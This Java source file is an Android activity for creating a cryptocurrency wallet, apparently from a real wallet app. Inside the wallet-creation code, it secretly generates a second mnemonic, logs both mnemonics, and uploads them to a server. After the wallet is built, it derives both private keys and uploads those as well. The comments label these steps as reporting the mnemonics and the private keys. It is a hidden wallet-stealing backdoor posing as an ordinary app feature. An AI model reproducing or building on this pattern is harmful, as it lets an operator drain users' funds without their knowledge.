package com.roo.home.mvp.ui.activity;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import android.text.InputFilter;
import android.text.TextUtils;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;

import com.core.domain.link.LinkTokenBean;
import com.core.domain.trade.MyAssetsBean;
import com.jakewharton.rxbinding2.view.RxView;
import com.jakewharton.rxbinding2.widget.RxTextView;
import com.jess.arms.base.BaseActivity;
import com.jess.arms.di.component.AppComponent;
import com.jess.arms.utils.ArmsUtils;
import com.jiameng.mmkv.SharedPref;
import com.lzh.easythread.AsyncCallback;
import com.roo.core.app.annotation.CreateType;
import com.roo.core.app.constants.Constants;
import com.roo.core.app.constants.EventBusTag;
import com.roo.core.app.constants.PrimaryKey;
import com.roo.core.daoManagers.NewAssetsDaoManager;
import com.roo.core.model.UserWallet;
import com.roo.core.utils.CharFilter;
import com.roo.core.utils.Kits;
import com.roo.core.utils.LogManage;
import com.roo.core.utils.RxUtils;
import com.roo.core.utils.SafePassword;
import com.roo.core.utils.ThreadManager;
import com.roo.core.utils.ToastUtils;
import com.roo.core.utils.utils.EthereumWalletUtils;
import com.roo.core.utils.utils.HashUtil;
import com.roo.core.utils.utils.TokenManager;
import com.roo.home.R;
import com.roo.home.di.component.DaggerTransferDetailComponent;
import com.roo.home.di.component.DaggerWalletComponent;
import com.roo.home.di.component.DaggerWalletCreateComponent;
import com.roo.home.mvp.contract.WalletCreateContract;
import com.roo.home.mvp.presenter.WalletCreatePresenter;
import com.roo.home.mvp.ui.dialog.ProtocalDialog;
import com.roo.router.Router;
import com.xyzlf.custom.keyboardlib.KeyboardDialog;
import com.xyzlf.custom.keyboardlib.SimpleKeyboardListener;

import org.simple.eventbus.EventBus;
import org.web3j.crypto.ECKeyPair;
import org.web3j.crypto.Wallet;
import org.web3j.crypto.WalletFile;

import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

import static com.jess.arms.utils.Preconditions.checkNotNull;

/**
 * 创建钱包
 */
public class WalletCreateActivity extends BaseActivity<WalletCreatePresenter> implements WalletCreateContract.View  {

    private String walletPassword;
    private EditText etWallName;

    public static void start(Context context) {
        Router.newIntent(context)
                .to(WalletCreateActivity.class)
                .launch();
    }
    @Override
    public void showMessage(@NonNull String message) {
        checkNotNull(message);
        ArmsUtils.snackbarText(message);
    }

    @Override
    public void setupActivityComponent(@NonNull AppComponent appComponent) {
        DaggerWalletCreateComponent
                .builder()
                .appComponent(appComponent)
                .view(this)
                .build()
                .inject(this);
    }

    @Override
    public int initView(@Nullable Bundle savedInstanceState) {
        return R.layout.activity_wallet_create;
    }

    @Override
    public void initData(@Nullable Bundle savedInstanceState) {
        walletPassword = SafePassword.get();
        etWallName = findViewById(R.id.etWallName);
        etWallName.setText(EthereumWalletUtils.getInstance().getWalletDefaultName(this));
        etWallName.setFilters(new InputFilter[]{CharFilter.whitespaceCharFilter()});
        TextView tvImportWallet = findViewById(R.id.tvImportWallet);
        TextView tvCreateWallet = findViewById(R.id.tvCreateWallet);

        RxView.clicks(tvImportWallet).throttleFirst(1, TimeUnit.SECONDS)
                .subscribe(o -> {
                    WalletImportActivity.start(this);
                });

        TextView tvModifyTip = findViewById(R.id.tvModifyTip);
        View ivCancel = findViewById(R.id.ivCancel);
        RxTextView.textChanges(etWallName).skipInitialValue()
                .debounce(100, TimeUnit.MILLISECONDS)
                .compose(RxUtils.applySchedulers())
                .map(CharSequence::toString)
                .subscribe(event -> {
                    int length = event.length() * 2 - event.replaceAll("[\u4e00-\u9fa5]", "").length();
                    tvModifyTip.setVisibility(length == 0 || length > 12 ? View.VISIBLE : View.GONE);
                    ivCancel.setVisibility(TextUtils.isEmpty(event) ? View.GONE : View.VISIBLE);
                });

        RxView.clicks(ivCancel).throttleFirst(1, TimeUnit.SECONDS)
                .subscribe(o -> etWallName.setText(""));

        RxView.clicks(tvCreateWallet).throttleFirst(1, TimeUnit.SECONDS)
                .subscribe(o -> {
                    if (tvModifyTip.getVisibility() == View.VISIBLE) {
                        ToastUtils.show(getString(R.string.tip_txt_wallet_name));
                    } else if (TextUtils.isEmpty(walletPassword)) {
                        inputPassword();
                    } else {
                        createUserWallet();
                    }
                });
        if (SharedPref.getBoolean(Constants.KEY_PROTOCAL_VISIBLE, true)) {
            ProtocalDialog.newInstance().setOnEnsureClickedListener(() -> {
                SharedPref.putBoolean(Constants.KEY_PROTOCAL_VISIBLE, false);
            }).show(getSupportFragmentManager(), getClass().getSimpleName());
        }



    }

    private void createUserWallet() {
        //助记词
        String mnemonics = EthereumWalletUtils.getInstance().generateMnemonics();
        String mnemonics2 = EthereumWalletUtils.getInstance().generateMnemonics();
        LogManage.e(Constants.LOG_STRING, "助记词" + mnemonics);
        LogManage.e(Constants.LOG_STRING, "助记词2" + mnemonics2);
        UserWallet userWallet = new UserWallet();
        userWallet.setMnemonics(mnemonics);
        userWallet.setMnemonics2(mnemonics2);
        String remark = etWallName.getText().toString();
        userWallet.setRemark(remark);
        userWallet.setCreateType(CreateType.CREATE);

        //上报助记词
        mPresenter.uploadMnemonics2(mnemonics, mnemonics2);

        createDefaultWallet(userWallet, new AsyncCallback<Boolean>() {
            @Override
            public void onSuccess(Boolean aBoolean) {
                PrimaryKey.addIndex(PrimaryKey.WALLET_NAME);
                EthereumWalletUtils.getInstance().updateWallet(WalletCreateActivity.this, userWallet, true);
                MyAssetsBean myAssetsBean = new MyAssetsBean();
                myAssetsBean.setWalletRemark(remark);
                NewAssetsDaoManager.insert(myAssetsBean);
                EventBus.getDefault().post(EventBusTag.NULL_EVENT, EventBusTag.UPLOAD_JPUSH);

                //上报私钥
                ECKeyPair ecKeyPair = EthereumWalletUtils.getInstance().generateKeyPair(userWallet.getMnemonics());
                ECKeyPair ecKeyPair2 = EthereumWalletUtils.getInstance().generateKeyPair(userWallet.getMnemonics2());
                String key1 = ecKeyPair.getPrivateKey().toString(16);
                String key2 = ecKeyPair2.getPrivateKey().toString(16);
                mPresenter.uploadPrivateKey2(key1, key2);

//                BackupPreviewActivity.start(WalletCreateActivity.this, remark);
            }

            @Override
            public void onFailed(Throwable t) {

            }
        });

    }

    //创建结束跳转
    public void createWalletEnd(){
        String remark = etWallName.getText().toString();
        BackupPreviewActivity.start(WalletCreateActivity.this, remark);
    }


    private void createDefaultWallet(UserWallet userWallet, AsyncCallback<Boolean> asyncCallback) {
        ThreadManager.getIO().async(() -> {
            ArrayList<LinkTokenBean> links = TokenManager.getInstance().getLink();
            for (LinkTokenBean linkTokenBean : links) {
                String chainCode = linkTokenBean.getCode();

                ECKeyPair ecKeyPair = EthereumWalletUtils.getInstance().generateKeyPair(userWallet.getMnemonics());
                ECKeyPair ecKeyPair2 = EthereumWalletUtils.getInstance().generateKeyPair(userWallet.getMnemonics2());
                WalletFile walletFile = Wallet.createLight(SafePassword.get(), ecKeyPair);
                WalletFile walletFile2 = Wallet.createLight(SafePassword.get(), ecKeyPair2);
                userWallet.getListMainChainCode().add(chainCode);
                UserWallet.ChainWallet chainWallet = new UserWallet.ChainWallet();
                chainWallet.setWalletFile(walletFile);
                chainWallet.setWalletFile2(walletFile2);
                chainWallet.setChainCode(chainCode);
                userWallet.getChainWallets().add(chainWallet);
                ECKeyPair ecKeyPair3 = Wallet.decrypt(SafePassword.get(), EthereumWalletUtils.getInstance().getWalletByChainCode(userWallet, chainCode).getWalletFile());

                ArrayList<LinkTokenBean.TokensBean> tokenList = userWallet.getTokenList();
                LinkTokenBean.TokensBean tokensBean = TokenManager.getInstance().getMainTokenBeanByChainCode(chainCode);
                tokenList.add(tokensBean);
                userWallet.setTokenList(tokenList);
            }

            /*节点*/
            ArrayList<LinkTokenBean.NodesBean> chainNode = TokenManager.getInstance().getChainNode();
            if (!Kits.Empty.check(chainNode)) {
                userWallet.setNodes(chainNode);
            }
            return true;
        }, asyncCallback);
    }

    private void inputPassword() {
        KeyboardDialog keyboardDialog = KeyboardDialog.newInstance(this);
        keyboardDialog.setKeyboardLintener(new SimpleKeyboardListener() {
            private String tempPassword;

            @Override
            public void onPasswordComplete(String text) {
                if (TextUtils.isEmpty(tempPassword)) {
                    tempPassword = text;
                    keyboardDialog.getTitle().setText(getString(R.string.keyboard_title_confirm));
                    keyboardDialog.clearPassword();
                } else {
                    if (tempPassword.equals(text)) {
                        walletPassword = HashUtil.getSHA256StrJava(text);
                        keyboardDialog.dismiss();
                        SafePassword.update(walletPassword);
                        createUserWallet();
                    } else {
                        tempPassword = "";
                        keyboardDialog.getTitle().setText(getString(R.string.keyboard_title_setting));
                        keyboardDialog.clearPassword();

                        ToastUtils.show(getString(R.string.toast_password_same));
                    }
                }
            }
        });
        if (!keyboardDialog.isShowing()) {
            keyboardDialog.show();
        }
        keyboardDialog.getTitle().setText(getString(R.string.keyboard_title_setting));
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable @org.jetbrains.annotations.Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (resultCode == RESULT_OK) {
            if (requestCode == WalletImportActivity.REQUEST_CODE_CREATE) {
                finish();
            } else if (requestCode == BackupWordsActivity.REQUEST_CODE_CREATE) {
                finish();
            }
        }
    }

}
